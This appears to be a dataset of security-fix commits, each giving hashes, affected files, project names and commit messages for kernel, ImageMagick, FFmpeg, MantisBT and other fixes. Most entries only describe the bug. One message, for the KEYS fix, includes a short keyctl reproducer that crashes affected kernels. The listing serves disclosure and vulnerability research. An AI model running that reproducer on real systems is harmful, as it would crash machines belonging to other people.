net: handle no dst on skb in icmp6_send\n\nAndrey reported the following while fuzzing the kernel with syzkaller:\n\nkasan: CONFIG_KASAN_INLINE enabled kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN Modules linked in: CPU: 0 PID: 3859 Comm: a.out Not tainted 4.9.0-rc6+ #429 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 task: ffff8800666d4200 task.stack: ffff880067348000 RIP: 0010:[<ffffffff833617ec>]  [<ffffffff833617ec>] icmp6_send+0x5fc/0x1e30 net/ipv6/icmp.c:451 RSP: 0018:ffff88006734f2c0  EFLAGS: 00010206 RAX: ffff8800666d4200 RBX: 0000000000000000 RCX: 0000000000000000 RDX: 0000000000000000 RSI: dffffc0000000000 RDI: 0000000000000018 RBP: ffff88006734f630 R08: ffff880064138418 R09: 0000000000000003 R10: dffffc0000000000 R11: 0000000000000005 R12: 0000000000000000 R13: ffffffff84e7e200 R14: ffff880064138484 R15: ffff8800641383c0 FS:  00007fb3887a07c0(0000) GS:ffff88006cc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000020000000 CR3: 000000006b040000 CR4: 00000000000006f0 Stack:  ffff8800666d4200 ffff8800666d49f8 ffff8800666d4200 ffffffff84c02460  ffff8800666d4a1a 1ffff1000ccdaa2f ffff88006734f498 0000000000000046  ffff88006734f440 ffffffff832f4269 ffff880064ba7456 0000000000000000 Call Trace:  [<ffffffff83364ddc>] icmpv6_param_prob+0x2c/0x40 net/ipv6/icmp.c:557  [<     inline     >] ip6_tlvopt_unknown net/ipv6/exthdrs.c:88  [<ffffffff83394405>] ip6_parse_tlv+0x555/0x670 net/ipv6/exthdrs.c:157  [<ffffffff8339a759>] ipv6_parse_hopopts+0x199/0x460 net/ipv6/exthdrs.c:663  [<ffffffff832ee773>] ipv6_rcv+0xfa3/0x1dc0 net/ipv6/ip6_input.c:191  ...\n\nicmp6_send / icmpv6_send is invoked for both rx and tx paths. In both cases the dst->dev should be preferred for determining the L3 domain if the dst has been set on the skb. Fallback to the skb->dev if it has not. This covers the case reported here where icmp6_send is invoked on Rx before the route lookup.\n\nFixes: 5d41ce29e ("net: icmp6_send should use dst dev to determine L3 domain") Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David Ahern <dsa@cumulusnetworks.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    049c74699ce93cf126feff06d632ea63fba36742
File(s) In Commit: 
    recurly/resource.py
Blob(s) In Commit: 
    b0d214ae74c5e91fb152f9f50d425bf1eacd6299
Blob(s) Before Fix: 
    51fbf961db5a582d21eee800fdb5ea326f3a4de1
Projects:
    15five_recurly-client-python
Commit Message for 049c74699ce93cf126feff06d632ea63fba36742:
Fix SSRF: do not use urljoin, quote uuids

======================================================================
Commit With Fix: 
    88ccff152604e0f1012653a596d802ff7ede3145
File(s) In Commit: 
    net/rootd/src/rootd.cxx
Blob(s) In Commit: 
    56bbeec29164a4d77923c17618d617c266004f54
Blob(s) Before Fix: 
    14e185cc8e649c78bd198b1fccb5bfd9e0a28c61
Projects:
    540KJ_root
Commit Message for 88ccff152604e0f1012653a596d802ff7ede3145:
rootd: do not use popen() to expand path names (#513)\n\nAddressed security threat reported by S. Luders.  Using the same technology used in TSystem::ExpandFileName (with clang-format processing).

======================================================================
Commit With Fix: 
    35c94dc6acc418f1ad7f6241a6680e5327495793
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    5f425c974e762421f6b91aecf1fff184c1901185
Blob(s) Before Fix: 
    013b9f48afb72f68d08922d02e0232f6dc6059fa
    2a7fc01b78b50126658ce3496c23ce50ccd9e0ed
    33766b7337cd6bc6eae8754402f3ccbcc8e90330
    39598f7a5c7f843a6263d3f07534a228f9b55282
    814518272de4301c2cada21362074c093e1b1370
    8b141e12d40572c1a32668c3c9f1098cd48eea5e
    90dae392f699ea1ade17d0db8559d993dcae3229
    c6b10f9a9621b09155ddb9bd014a092499b49a62
    cbed12920ca37020e403fd35e352b5f51d36eb92
    d159620cec858e33c66c3b6fda5ea731621ca440
    f3212871d625db53a6491bd61fd99765d086b112
Projects:
    5hadowblad3_file
Commit Message for 35c94dc6acc418f1ad7f6241a6680e5327495793:
Fix always true condition (Thomas Jarosch)

======================================================================
Commit With Fix: 
    b4e458612d4294e0cfe01dbf1c0b09a07a8133a4
File(s) In Commit: 
    JfifDecode.cpp
Blob(s) In Commit: 
    8026496529b29018a4150f1b87a82d9fa89cf0a4
Blob(s) Before Fix: 
    78955c98e34d88585b5b07eeef231b2179a41ce8
Projects:
    alggm_JPEGsnoop
Commit Message for b4e458612d4294e0cfe01dbf1c0b09a07a8133a4:
Fixed div0 vulnerability in SampFact

======================================================================
Commit With Fix: 
    a2ed226637f8e66c9b089784b5e58eccf2e2fb30
File(s) In Commit: 
    public/js/app/note.js
Blob(s) In Commit: 
    e7ea05cd19e4d9f9af90d8a58df73e50a3694161
Blob(s) Before Fix: 
    e649be69b7271be6c1427b4046aa9ee8e20972c0
Projects:
    0326_desktop-app
Commit Message for a2ed226637f8e66c9b089784b5e58eccf2e2fb30:
Starred notes XXS

======================================================================
Commit With Fix: 
    7aeb624b44f86d335841242ff427433190e7168a
File(s) In Commit: 
    miniupnpc/upnpreplyparse.c
    miniupnpd/upnpreplyparse.c
Blob(s) In Commit: 
    ae84b0bac860983a25820e39cc8d5807734f5034
Blob(s) Before Fix: 
    5de5796a39547e267347a77d57ff044a1d02e381
Projects:
    007jasonsmith_Catch
Commit Message for 7aeb624b44f86d335841242ff427433190e7168a:
properly initialize data structure for SOAP parsing in ParseNameValue()\n\ntopelt field was not properly initialized.\n\nshould fix #268

======================================================================
Commit With Fix: 
    1e38da300e1e395a15048b0af1e5305bd91402f6
File(s) In Commit: 
    fs/timerfd.c
Blob(s) In Commit: 
    384fa759a563341b309df47537f9c94da0ee9ebb
Blob(s) Before Fix: 
    053818dd6c18be8f228e1c40483e50d78aa78007
    21b1e9c26df2571cd06e8be9e91b3ba365819b72
    9ae4abb4110b84ef286facc88e66be9d954a021d
    ab8dd153838174f3d2fbe1b7a31e98401429fd00
    b94fa6c3c6ebe8c7308aea0052f3afacad9745c4
    c173cc196175b4e4f72a6553b0faba67cdead250
    eccebf229097ac90f1aed00df095bbbfb29a2dc3
Projects:
    0-T-0_ps4-linux
Commit Message for 1e38da300e1e395a15048b0af1e5305bd91402f6:
timerfd: Protect the might cancel mechanism proper\n\nThe handling of the might_cancel queueing is not properly protected, so parallel operations on the file descriptor can race with each other and lead to list corruptions or use after free.\n\nProtect the context for these operations with a seperate lock.\n\nThe wait queue lock cannot be reused for this because that would create a lock inversion scenario vs. the cancel lock. Replacing might_cancel with an atomic (atomic_t or atomic bit) does not help either because it still can race vs. the actual list operation.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: "linux-fsdevel@vger.kernel.org" Cc: syzkaller <syzkaller@googlegroups.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: linux-fsdevel@vger.kernel.org Link: http://lkml.kernel.org/r/alpine.DEB.2.20.1701311521430.3457@nanos Signed-off-by: Thomas Gleixner <tglx@linutronix.de>\n\n

======================================================================
Commit With Fix: 
    15d3042a937c13f5d9244241c7a9c8416ff6e82a
File(s) In Commit: 
    fs/f2fs/super.c
Blob(s) In Commit: 
    397b1e816b3696b8d5bb992d2b8d3a8a031ee548
Blob(s) Before Fix: 
    3995e926ba3a366218d4ddc4ec2bcaccb0e855ab
    5ca78308d5ec9b827a9229b1b022b166e38985eb
    83355ec4a92cdeb86d4be8d4630e01e7b0c96a28
Projects:
    0-T-0_ps4-linux
Commit Message for 15d3042a937c13f5d9244241c7a9c8416ff6e82a:
f2fs: sanity check checkpoint segno and blkoff\n\nMake sure segno and blkoff read from raw image are valid.\n\nCc: stable@vger.kernel.org Signed-off-by: Jin Qian <jinqian@google.com> [Jaegeuk Kim: adjust minor coding style] Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>

======================================================================
Commit With Fix: 
    3dd6812412289a199564e63fffd0a9754010b9e0
File(s) In Commit: 
    admin/cat_options.php
Blob(s) In Commit: 
    5fd4d04ce17b02eeaa695e7dfe3f66fc9237f2be
Blob(s) Before Fix: 
    042adfe9606aa30af93b147dc3c76d61de87708b
Projects:
    7tonin_Piwigo
Commit Message for 3dd6812412289a199564e63fffd0a9754010b9e0:
check input parameter for cat_options pages\n\nsolving https://github.com/Piwigo/Piwigo/issues/724

======================================================================
Commit With Fix: 
    385aee965b4e4c36551c362a334378d2985b722a
File(s) In Commit: 
    drivers/gpu/drm/virtio/virtgpu_object.c
Blob(s) In Commit: 
    6f66b7347cd0d68c1257170e3521bbdd100bbaea
Blob(s) Before Fix: 
    09b526518f5a64b75288cc5738ae9ad7e6d0ff12
    1244cdf528599312d9596290b37077958fafa09a
    1483daebe057d099dcaf05cfe964b241efec12f9
    2c624c784c1d7317c465bb297eb31ad95fc7c242
    9f2f470efd9bdffae6a37668bd2b38b2b91cb2d3
    b2da31310d24c041750b92a96f91ddf8084978c7
    eca7655374701f628990410c99f7a71ea20b5435
    f1753377bc501a43608ecc285cefcc78dadba58f
    f300eba95bb1bff32ad8e9be2a8250779ec255b6
Projects:
    0-T-0_ps4-linux
Commit Message for 385aee965b4e4c36551c362a334378d2985b722a:
drm/virtio: don't leak bo on drm_gem_object_init failure\n\nReported-by: 李强 <liqiang6-s@360.cn> Signed-off-by: Gerd Hoffmann <kraxel@redhat.com> Link: http://patchwork.freedesktop.org/patch/msgid/20170406155941.458-1-kraxel@redhat.com

======================================================================
Commit With Fix: 
    c57997e76ec70862174a1b3b3aeb62a6f8570e85
File(s) In Commit: 
    shlr/grub/kern/disk.c
Blob(s) In Commit: 
    f93116854c6227bca2e3485846ff1b0ba73aec72
Blob(s) Before Fix: 
    a4d3f867c0bf3f089fb9e6ca67e6b3f78e178f23
Projects:
    0-T-0_radare2
Commit Message for c57997e76ec70862174a1b3b3aeb62a6f8570e85:
Fix r2_hbo_grub_memmove ext2 crash

======================================================================
Commit With Fix: 
    f991af3daabaecff34684fd51fac80319d1baad1
File(s) In Commit: 
    ipc/mqueue.c
Blob(s) In Commit: 
    eb1391b52c6f84fe75dec4e8366d858341ac665a
Blob(s) Before Fix: 
    0b13ace266f2d06ee423d8d0d42f9e1946de698a
    161a1807e6efb0fe8e773c41dafc8b4a76b38f71
    216cad1ff0d0c475c6f6755156abc57d89573e0c
    4fcf39af17768345be5f60e08e44af14b14bad76
    7635a1cf99f3da986b0cfa57774c7ad38ef28fe3
    781c1399c6a3b0fa0b81c9567dd3096276a17d65
    7a2d8f0c8ae506d631bf3fc455f53b042ef29401
    8cbd6e6894d514d2078c4af3bcb4e77c68a73abf
    9649ecd8a73a704fe07e3d678ac96723d33aec05
    a6ced9e07e1cc889f96990328b5d77a35d9ed77d
    ade739f67f1df67fc17cf631da2994eef0e3d95c
    c9ff943f19abc68158278a0221c6e8a6e432fec5
    d240256263103f89972ab5e62201549a7074a829
    e8d41ff57241d86e6c2aa0c46e6408897491256e
Projects:
    0-T-0_ps4-linux
Commit Message for f991af3daabaecff34684fd51fac80319d1baad1:
mqueue: fix a use-after-free in sys_mq_notify()\n\nThe retry logic for netlink_attachskb() inside sys_mq_notify() is nasty and vulnerable:\n\n1) The sock refcnt is already released when retry is needed 2) The fd is controllable by user-space because we already    release the file refcnt\n\nso we when retry but the fd has been just closed by user-space during this small window, we end up calling netlink_detachskb() on the error path which releases the sock again, later when the user-space closes this socket a use-after-free could be triggered.\n\nSetting 'sock' to NULL here should be sufficient to fix it.\n\nReported-by: GeneBlue <geneblue.mail@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ba4beaf6149f7241c8bd85fe853318c2f6837ad0
File(s) In Commit: 
    libavcodec/apedec.c
Blob(s) In Commit: 
    15eb416ba4ea9b226c0f86907b76c312b5586ef3
Blob(s) Before Fix: 
    03afd756dcb688c6882257670119d1d268ed093e
    0dbde8276e7faadd30b18890f6812a0c31e0fc29
    536361cd8468a78b75680d4ce082ae88d244aafe
    5536e0f8b1f2f200bc9755d698a5d267d1a28834
    73fa030e6ec879a77f90ba11af929e8760816128
    7e1c6bb6cd950f30f8a5f3edf3bc5d713c28be21
    a6b14b8e247c7ec84f346e4581f9d38146139281
    a90a07fa7deff206fa91344428e8a4a4ac27cf37
    b3969eb93a22286af46cd299bacc2a5169099b5c
    b99598b4ee74ed3b5ac762a5f1a980824455fa07
    bed9a96984e6feaf4636bbb7f497f547bea2e947
    da45e85e51afefaaef914b08b5110820d8154bd3
Projects:
    00ERNEST00_FFmpeg
Commit Message for ba4beaf6149f7241c8bd85fe853318c2f6837ad0:
avcodec/apedec: Fix integer overflow\n\nFixes: out of array access Fixes: PoC.ape and others\n\nFound-by: Bingchang, Liu@VARAS of IIE Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    72a50e400d98d7a2fd610caedfeb9af043dc5582
File(s) In Commit: 
    coders/screenshot.c
Blob(s) In Commit: 
    e2e6d8605acc09bbb03dd27db1f2b7abdb553e6a
Blob(s) Before Fix: 
    7e25bf6cc17053f4fc602d73cd70cfb42ff5d98f
    e9223c73926204e17e2f690d1e3147cf9d4633f0
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 72a50e400d98d7a2fd610caedfeb9af043dc5582:
Fixed potential memory leak.

======================================================================
Commit With Fix: 
    f6463ca9588579633bbaed9460899d892aa3c64a
File(s) In Commit: 
    coders/jpeg.c
Blob(s) In Commit: 
    c3a813a6e593f8d3f0e9cbeda398089a388369c2
Blob(s) Before Fix: 
    2d1be58a9231b8e56d185f8c4cc68854b820e1ed
    3a82319da2c3038526a6b4df516892df74a2816d
    73f6e49d8a50431ce0fee542bb5b6d96bbd1ecba
Projects:
    2016repotsheyue_ImageMagick
Commit Message for f6463ca9588579633bbaed9460899d892aa3c64a:
Zero pixel buffer

======================================================================
Commit With Fix: 
    948356eec65aea91995d4b7cc487d197d2c5f602
File(s) In Commit: 
    coders/jpeg.c
Blob(s) In Commit: 
    9b94e7252cd7142a8790f90713bf50ecdc9475ad
Blob(s) Before Fix: 
    74006a49c4ec04adb63eeaf6bd14c2ab5b8ab903
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 948356eec65aea91995d4b7cc487d197d2c5f602:
...

======================================================================
Commit With Fix: 
    ecf9267a24b2c3c0cd211dbdfa9ef2232511972a
File(s) In Commit: 
    rsvg-filter.c
Blob(s) In Commit: 
    804d6375f513908d5375ff2b44c89462464b421d
Blob(s) Before Fix: 
    8e612263689ab57d5c4177e614b90d5f9b268c28
Projects:
    GNOME_librsvg
Commit Message for ecf9267a24b2c3c0cd211dbdfa9ef2232511972a:
bgo#783835 - Don't divide by zero in box_blur_line() for gaussian blurs\n\nWe were making the decision to use box blurs, instead of a true Gaussian kernel, based on the size of *both* x and y dimensions.  Do them individually instead.

======================================================================
Commit With Fix: 
    816ecab6c532ae086ff4186b3eaf4aa7092d536f
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    c61b6874e7ad5c817a732bece839eae339bc03a7
Blob(s) Before Fix: 
    f6ddf6d7c3e2211a61cc3e2fdb3513023690ffee
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 816ecab6c532ae086ff4186b3eaf4aa7092d536f:
https://github.com/ImageMagick/ImageMagick/issues/58

======================================================================
Commit With Fix: 
    63973f71e337ead8ca7b7ae2a043b837032dc3fe
File(s) In Commit: 
    angular/core/config/marked.coffee
    angular/core/services/render_service.coffee
Blob(s) In Commit: 
    e59e59b7559f2c18dd8cb12d2e78713171a16f7f
Blob(s) Before Fix: 
    a42c0fd7843b2e567213aa4ca42a6517e6861647
    bac148295190895f52fe2fadd224d9bab478005f
Projects:
    07fi123_loomio
Commit Message for 63973f71e337ead8ca7b7ae2a043b837032dc3fe:
Ensure existing marked renderer code runs with customization (#4078)\n\n* Ensure existing marked renderer code runs with customization    * Use noopener / noreferrer for marked links

======================================================================
Commit With Fix: 
    296debd213bd6dce7647cedd34eb64e5b94cdc92
File(s) In Commit: 
    libavcodec/dnxhddec.c
Blob(s) In Commit: 
    f46e41a4562393328c6ef14012df6bbf1bc75689
Blob(s) Before Fix: 
    18080803fa30654588c4bdf36019f1b457efcddc
    383e64ca9e07a7bba27743e5fc3adf117ec09f75
    40d41f9bf11e538846368643fbfd9cbe81190834
    4a423603886a602e99aa45d812dbbd32d3a9b087
    4d1b006bb50b5737dbb40e0d3ed82f3280c4a6c6
    70ce264c9683ff3312997a6c64b9c0956b398a4e
    75247eaff439f7682255edc64ec04b2d71f9a31c
    7cb6a7526127405bb0dc475182b1b427e0c6b00e
    defbf101e0b4b00186a4f3f93adc968d9fef9bb9
    e33593c1149ed36f3214398a3ee34281fd1e82f5
    fd58795de3d24055f1c4fea283c4e9e290ff5fb3
Projects:
    00ERNEST00_FFmpeg
Commit Message for 296debd213bd6dce7647cedd34eb64e5b94cdc92:
avcodec/dnxhddec: Move mb height check out of non hr branch\n\nFixes: out of array access Fixes: poc.dnxhd\n\nFound-by: Bingchang, Liu@VARAS of IIE Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    9b5b71dadbeeeec27efea59f562ac5bd6d2673b7
File(s) In Commit: 
    manage_user_page.php
Blob(s) In Commit: 
    2d6917e3daa448d217513955359b4007ea35e572
Blob(s) Before Fix: 
    08a4b54e72b22a3202ef9b3cf0fb9e5e485d0ed6
    2dd9f1a05a45acb489b66bffe523c5817e1a9eed
    e81f95c20a7165117d5761a71cc5ffd0fb371eee
    fb43546026e8ea0ebf62821d258782716257669f
Projects:
    01-Scripts_mantisbt
Commit Message for 9b5b71dadbeeeec27efea59f562ac5bd6d2673b7:
Fix XSS in manage_user_page.php (CVE-2017-12062)\n\ntrichimtrich (https://twitter.com/trichimtrich) reported this vulnerability, allowing an attacker to inject arbitrary code through a crafted 'filter' form variable.\n\nPrevent the attack by sanitizing the variable before output.\n\nFixes #23166\n\nSigned-off-by: Damien Regad <dregad@mantisbt.org>

======================================================================
Commit With Fix: 
    6265539776a0810b7ce6398c27866ddb9c6bd154
File(s) In Commit: 
    drivers/base/platform.c
Blob(s) In Commit: 
    97332d094fe23a7d6e6ad463bcc2262e1313d46c
Blob(s) Before Fix: 
    493e03fa0e073c0b2ffad4a914aab0eab80bca53
    6482d47deb507090346437d99e9b160b2c810942
    a102152301c8327b347e32d11230d635d3655cc2
    c2456839214aee8065beaed9752d29d04371fbac
    c4af00385502ffd9039bc73d1eccc2eedef33ce4
    dff82a3c2caa90162076a56c7911554d6fb2d09f
    f437afa17f2b1d2933ed0882d7e7f291c6d86309
Projects:
    0-T-0_ps4-linux
Commit Message for 6265539776a0810b7ce6398c27866ddb9c6bd154:
driver core: platform: fix race condition with driver_override\n\nThe driver_override implementation is susceptible to race condition when different threads are reading vs storing a different driver override. Add locking to avoid race condition.\n\nFixes: 3d713e0e382e ("driver core: platform: add device binding path 'driver_override'") Cc: stable@vger.kernel.org Signed-off-by: Adrian Salido <salidoa@google.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    51aa68e7d57e3217192d88ce90fd5b8ef29ec94f
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    8e1ae716f9389b5cd46f6333982f3312c3f670b1
Blob(s) Before Fix: 
    09204993a7392ddfb82f3856bd97233210a80c63
Projects:
    0-T-0_ps4-linux
Commit Message for 51aa68e7d57e3217192d88ce90fd5b8ef29ec94f:
kvm: nVMX: Don't allow L2 to access the hardware CR8\n\nIf L1 does not specify the "use TPR shadow" VM-execution control in vmcs12, then L0 must specify the "CR8-load exiting" and "CR8-store exiting" VM-execution controls in vmcs02. Failure to do so will give the L2 VM unrestricted read/write access to the hardware CR8.\n\nThis fixes CVE-2017-12154.\n\nSigned-off-by: Jim Mattson <jmattson@google.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    9e3f7a29694049edd728e2400ab57ad7553e5aa9
File(s) In Commit: 
    arch/arm64/kvm/sys_regs.c
Blob(s) In Commit: 
    87e7e6608cd8a31e6913be8134b90e443df314cb
Blob(s) Before Fix: 
    02e9d09e1d804b4e9344427037dd5a2b88d378ba
    03244582bc555af4b303fca4370890e278114d16
    31c144f7339a08371f1624d55b0cf50a500bf2cf
    444e8edd71b2c24d8b6595880d8d8879d23186f7
    4cc3b719208e0a8238930d44b409b2f7c2beb9f5
    7bbe3ff02602f93f87ffd8a04ac0577ce3aea038
    7cee552ce0bf025759fb75a4c13850fa641878c8
    87a64e8db04c4dac07a5d289ad0c2dd22860f0e2
    a57d650f552cd67ed15964b645001791bf05ae6c
    b0b225ceca18f956a805c2862f299d0ee9575749
    c370b4014799697c292a99cf24721a425fcb3790
    d03d3af17e7eef784d528479e2f4fed305ee5f75
    d2650e84faf2f53f2afbdbd15e1f54d217e3fdb8
    e51367d159d0250aaa7e53d33803caddfbae9de8
    f302fdb3a030b452286ed5e50e4e2ecb9c0e54fc
Projects:
    0-T-0_ps4-linux
Commit Message for 9e3f7a29694049edd728e2400ab57ad7553e5aa9:
arm64: KVM: pmu: Fix AArch32 cycle counter access\n\nWe're missing the handling code for the cycle counter accessed from a 32bit guest, leading to unexpected results.\n\nCc: stable@vger.kernel.org # 4.6+ Signed-off-by: Wei Huang <wei@redhat.com> Signed-off-by: Marc Zyngier <marc.zyngier@arm.com>

======================================================================
Commit With Fix: 
    37863c43b2c6464f252862bf2e9768264e961678
File(s) In Commit: 
    security/keys/keyctl.c
Blob(s) In Commit: 
    365ff85d7e27122db220fad6d633f8e0b352209f
Blob(s) Before Fix: 
    04a764f71ec88e6385f2c3fc38d5cb903817dfce
    0b9ec78a7a7ad2b14af1ef0407e051e6dcef29ff
    447a7d5cee0f56ebcb1847d9442f6407e259be98
    4ad3212adebe8becc152f22d2448f8db4716146b
    52c34532c78562643fce84832a5b536baf84988b
    aa1d11a2913618b0227ced487d90630346c0886f
    ab0b337c84b4c02e4856719398edb94d1caf101a
    d580ad06b792ff539f124a620a4c8791740f22dd
    ed73c6c1c326c02bf0f4f80923e4792f292ec2fd
Projects:
    0-T-0_ps4-linux
Commit Message for 37863c43b2c6464f252862bf2e9768264e961678:
KEYS: prevent KEYCTL_READ on negative key\n\nBecause keyctl_read_key() looks up the key with no permissions requested, it may find a negatively instantiated key.  If the key is also possessed, we went ahead and called ->read() on the key.  But the key payload will actually contain the ->reject_error rather than the normal payload.  Thus, the kernel oopses trying to read the user_key_payload from memory address (int)-ENOKEY = 0x00000000ffffff82.\n\nFortunately the payload data is stored inline, so it shouldn't be possible to abuse this as an arbitrary memory read primitive...\n\nReproducer:     keyctl new_session     keyctl request2 user desc '' @s     keyctl read $(keyctl show | awk '/user: desc/ {print $1}')\n\nIt causes a crash like the following:      BUG: unable to handle kernel paging request at 00000000ffffff92      IP: user_read+0x33/0xa0      PGD 36a54067 P4D 36a54067 PUD 0      Oops: 0000 [#1] SMP      CPU: 0 PID: 211 Comm: keyctl Not tainted 4.14.0-rc1 #337      Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-20170228_101828-anatol 04/01/2014      task: ffff90aa3b74c3c0 task.stack: ffff9878c0478000      RIP: 0010:user_read+0x33/0xa0      RSP: 0018:ffff9878c047bee8 EFLAGS: 00010246      RAX: 0000000000000001 RBX: ffff90aa3d7da340 RCX: 0000000000000017      RDX: 0000000000000000 RSI: 00000000ffffff82 RDI: ffff90aa3d7da340      RBP: ffff9878c047bf00 R08: 00000024f95da94f R09: 0000000000000000      R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000      R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000      FS:  00007f58ece69740(0000) GS:ffff90aa3e200000(0000) knlGS:0000000000000000      CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033      CR2: 00000000ffffff92 CR3: 0000000036adc001 CR4: 00000000003606f0      Call Trace:       keyctl_read_key+0xac/0xe0       SyS_keyctl+0x99/0x120       entry_SYSCALL_64_fastpath+0x1f/0xbe      RIP: 0033:0x7f58ec787bb9      RSP: 002b:00007ffc8d401678 EFLAGS: 00000206 ORIG_RAX: 00000000000000fa      RAX: ffffffffffffffda RBX: 00007ffc8d402800 RCX: 00007f58ec787bb9      RDX: 0000000000000000 RSI: 00000000174a63ac RDI: 000000000000000b      RBP: 0000000000000004 R08: 00007ffc8d402809 R09: 0000000000000020      R10: 0000000000000000 R11: 0000000000000206 R12: 00007ffc8d402800      R13: 00007ffc8d4016e0 R14: 0000000000000000 R15: 0000000000000000      Code: e5 41 55 49 89 f5 41 54 49 89 d4 53 48 89 fb e8 a4 b4 ad ff 85 c0 74 09 80 3d b9 4c 96 00 00 74 43 48 8b b3 20 01 00 00 4d 85 ed <0f> b7 5e 10 74 29 4d 85 e4 74 24 4c 39 e3 4c 89 e2 4c 89 ef 48      RIP: user_read+0x33/0xa0 RSP: ffff9878c047bee8      CR2: 00000000ffffff92\n\nFixes: 61ea0c0ba904 ("KEYS: Skip key state checks when checking for possession") Cc: <stable@vger.kernel.org>	[v3.13+] Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com>

======================================================================
Commit With Fix: 
    ea6789980fdaa610d7eb63602c746bf6ec70cd2b
File(s) In Commit: 
    lib/assoc_array.c
Blob(s) In Commit: 
    4e53be8bc590dc2030a930aec5a2cac8c4fa6a30
Blob(s) Before Fix: 
    03dd576e67730fb2870c44512f55c1c0c39b77f3
    155c55d8db5fccb3ded0047d1fb1fcfef7673072
    59875eb278ea55f2683955dae36f7ebcbdc43bcd
    59fd7c0b119cbc3e0b61137732f76cc3759fb7c7
    5cd093589c5af2241453ceae757c6957cdb33d4c
    5e586f2e84c1b358ce47e039a96abc7f71ca29e0
    b77d51da8c73def55d1aea5ca6c34161652981a0
    c6659cb370331fa8afed30ee366b9b2432b9c6f0
Projects:
    0-T-0_ps4-linux
Commit Message for ea6789980fdaa610d7eb63602c746bf6ec70cd2b:
assoc_array: Fix a buggy node-splitting case\n\nThis fixes CVE-2017-12193.\n\nFix a case in the assoc_array implementation in which a new leaf is added that needs to go into a node that happens to be full, where the existing leaves in that node cluster together at that level to the exclusion of new leaf.\n\nWhat needs to happen is that the existing leaves get moved out to a new node, N1, at level + 1 and the existing node needs replacing with one, N0, that has pointers to the new leaf and to N1.\n\nThe code that tries to do this gets this wrong in two ways:\n\n (1) The pointer that should've pointed from N0 to N1 is set to point      recursively to N0 instead.\n\n (2) The backpointer from N0 needs to be set correctly in the case N0 is      either the root node or reached through a shortcut.\n\nFix this by removing this path and using the split_node path instead, which achieves the same end, but in a more general way (thanks to Eric Biggers for spotting the redundancy).\n\nThe problem manifests itself as:\n\n  BUG: unable to handle kernel NULL pointer dereference at 0000000000000010   IP: assoc_array_apply_edit+0x59/0xe5\n\nFixes: 3cb989501c26 ("Add a generic associative array implementation.") Reported-and-tested-by: WU Fan <u3536072@connect.hku.hk> Signed-off-by: David Howells <dhowells@redhat.com> Cc: stable@vger.kernel.org [v3.13-rc1+] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    954e3d2e7113e9ac06632aee3c69b8d818cc8952
File(s) In Commit: 
    lib/commonio.c
Blob(s) In Commit: 
    31edbaaf31b918205a811a7e5c13b2f8d281d375
Blob(s) Before Fix: 
    2e2f7785e8c1e86f5e528fbdb659f6eca76edaec
    b10da06a2e091b0780716b2c967757d02cc4a06a
Projects:
    AdamMajer_shadow
Commit Message for 954e3d2e7113e9ac06632aee3c69b8d818cc8952:
Fix buffer overflow if NULL line is present in db.\n\nIf ptr->line == NULL for an entry, the first cycle will exit, but the second one will happily write past entries buffer. We actually do not want to exit the first cycle prematurely on ptr->line == NULL. Signed-off-by: Tomas Mraz <tmraz@fedoraproject.org>

======================================================================
Commit With Fix: 
    307fa45d512641fcd105f0d57ca50c1437cd1b81
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    860d28ec41c005f2e7ee8610ec4137d46a3f93b2
Blob(s) Before Fix: 
    dfe6843ac1cc8bfdb501e091a86ec3bea57924ed
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 307fa45d512641fcd105f0d57ca50c1437cd1b81:
https://github.com/ImageMagick/ImageMagick/issues/542

======================================================================
Commit With Fix: 
    c9aa9f80828594eacbe3affe16c43d623562e5d8
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    080709c047c4fa1c5770c730a45e10e6618784fe
Blob(s) Before Fix: 
    dc8be52207470e8619bfd6295ee0c1f8876dc115
Projects:
    2016repotsheyue_ImageMagick
Commit Message for c9aa9f80828594eacbe3affe16c43d623562e5d8:
https://github.com/ImageMagick/ImageMagick/issues/550

======================================================================
Commit With Fix: 
    d9ccd8227c4c88a907cda5278408b73552cb0c07
File(s) In Commit: 
    coders/png.c
Blob(s) In Commit: 
    dc8be52207470e8619bfd6295ee0c1f8876dc115
Blob(s) Before Fix: 
    0253c82fcfa338ed7d2d700832e7d7325891d753
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d9ccd8227c4c88a907cda5278408b73552cb0c07:
https://github.com/ImageMagick/ImageMagick/issues/549

